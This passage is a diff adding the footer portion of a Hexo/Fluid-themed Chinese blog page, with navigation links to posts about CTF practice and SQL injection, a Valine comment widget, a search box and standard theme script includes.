+                        <span class="hidden-mobile">BUUCTF刷题笔记8</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/">
+                        <span class="hidden-mobile">无列名注入小记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
